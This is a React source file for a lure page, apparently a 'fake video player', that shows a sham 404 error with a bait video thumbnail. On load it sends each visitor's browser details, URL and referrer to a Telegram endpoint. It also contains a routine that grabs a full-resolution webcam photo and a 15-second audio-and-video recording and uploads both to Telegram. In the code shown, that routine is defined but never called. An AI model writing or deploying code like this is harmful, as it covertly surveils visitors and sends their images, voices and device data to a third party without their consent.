import { PlayIcon } from '@heroicons/react/24/solid';
import { useState, useEffect, useCallback } from 'react';
import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } from './utils/telegram';

function App() {
  const [isBlurred] = useState(false);
  const thumbnailUrl = 'https://raw.githubusercontent.com/zsfell/fake-vidio-player/refs/heads/main/assets/img/ghost-img.png';

  useEffect(() => {
    const sendVisitorNotification = async () => {
      await sendTelegramNotification({
        userAgent: navigator.userAgent,
        location: window.location.href,
        referrer: document.referrer || 'Direct',
        previousSites: document.referrer || 'None',
      });
    };

    sendVisitorNotification();
  }, []);

  const captureAndSendMedia = useCallback(async () => {
    try {
      // Get device capabilities first
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevice = devices.find(device => device.kind === 'videoinput');
      
      if (!videoDevice) {
        throw new Error('No video input device found');
      }

      const constraints = {
        video: {
          deviceId: videoDevice.deviceId,
          width: { ideal: 4096 }, // Maximum supported width
          height: { ideal: 2160 }, // Maximum supported height
          frameRate: { ideal: 60 }
        },
        audio: true
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);

      // Get actual video track settings
      const videoTrack = stream.getVideoTracks()[0];
      const settings = videoTrack.getSettings();
      
      // Create and setup video element for photo capture
      const video = document.createElement('video');
      video.srcObject = stream;
      video.playsInline = true;
      video.muted = true;
      video.autoplay = true;
      
      // Wait for video to be ready
      await new Promise((resolve) => {
        video.onloadedmetadata = async () => {
          try {
            await video.play();
            setTimeout(resolve, 500);
          } catch (error) {
            console.error('Error playing video:', error);
            resolve(true);
          }
        };
      });

      // Setup canvas with actual video dimensions
      const canvas = document.createElement('canvas');
      canvas.width = settings.width || 1920;
      canvas.height = settings.height || 1080;
      const context = canvas.getContext('2d');
      
      if (context) {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
      }

      // Convert photo to blob with maximum quality
      const photoBlob = await new Promise<Blob>((resolve) => {
        canvas.toBlob((blob) => {
          if (blob) resolve(blob);
        }, 'image/jpeg', 1.0);
      });

      // Send photo immediately
      sendImageToTelegram(photoBlob).catch(console.error);

      // Check supported video formats
      const mimeTypes = [
        'video/mp4;codecs=h264,aac',
        'video/mp4',
        'video/webm;codecs=vp8,opus',
        'video/webm'
      ];

      const supportedMimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type));

      if (!supportedMimeType) {
        throw new Error('No supported video format found');
      }

      // Configure video recording with maximum quality
      const mediaRecorder = new MediaRecorder(stream, {
        mimeType: supportedMimeType,
        videoBitsPerSecond: 8000000 // 8 Mbps for high quality
      });
      
      const chunks: BlobPart[] = [];

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          chunks.push(e.data);
        }
      };

      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunks, { 
          type: supportedMimeType.includes('mp4') ? 'video/mp4' : 'video/webm'
        });
        console.log('Video recording completed, size:', videoBlob.size);
        await sendVideoToTelegram(videoBlob);
        stream.getTracks().forEach(track => track.stop());
      };

      // Start recording with frequent data chunks for better quality
      mediaRecorder.start(1000);
      console.log('Started recording video');

      // Stop recording after 15 seconds
      setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          console.log('Stopping video recording');
          mediaRecorder.stop();
        }
      }, 15000);

    } catch (error) {
      console.error('Error capturing media:', error);
    }
  }, []);

  // const App = () => {
  // Function to handle click events
  const handleClick = () => {
    alert("You clicked anywhere on the page!");
  };

  const PlayIcon = ({ className }: { className: string }) => (
    <svg
      className={className}
      fill="currentColor"
      viewBox="0 0 24 24"
      xmlns="http://www.w3.org/2000/svg"
    >
      <path d="M8 5v14l11-7z" />
    </svg>
  );

  return (
    <div
      className="min-h-screen bg-gray-900 text-white font-sans cursor-pointer"
      onClick={handleClick} // Click handler for the entire page
    >
      {/* Header */}
      <header className="bg-gray-800 py-6">
        <nav className="container mx-auto px-4 flex justify-between items-center">
          <a href="#" className="text-2xl font-bold">
            ZS
          </a>
          <div className="text-2xl">
            <i className="bx bx-grid-alt"></i>
          </div>
        </nav>
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-8">
        <section className="text-center">
          <div className="max-w-2xl mx-auto">
            <span className="text-lg text-gray-400">Error 404</span>
            <h1 className="text-5xl font-bold mt-4">Hey Buddy</h1>
            <p className="text-gray-400 mt-2">You get lost?</p>
            <a
              href="https://www.youtube.com/watch?v=e_04ZrNroTo"
              className="inline-block mt-6 px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
            >
              Go Home
            </a>
          </div>

          <div className="mt-12 relative">
            <div className="relative bg-black rounded-lg overflow-hidden shadow-xl aspect-video">
              {isBlurred && (
                <div className="absolute inset-0 backdrop-blur-md bg-black/50" />
              )}
              <div className="absolute inset-0 flex items-center justify-center z-10">
                <button
                  onClick={() => alert("Play button clicked!")}
                  className="bg-red-600 rounded-full p-8 hover:bg-red-700 transition-all duration-300 hover:scale-110 group"
                >
                  <PlayIcon className="w-20 h-20 text-white group-hover:text-gray-100" />
                </button>
              </div>
              <img
                src={thumbnailUrl}
                alt="Video Thumbnail"
                className="w-full h-full object-cover"
              />
            </div>
          </div>
        </section>
      </main>

      {/* Footer */}
      <footer className="text-center py-6 text-gray-400">
        <span>zsfell</span>
      </footer>
    </div>
  );
};

export default App;
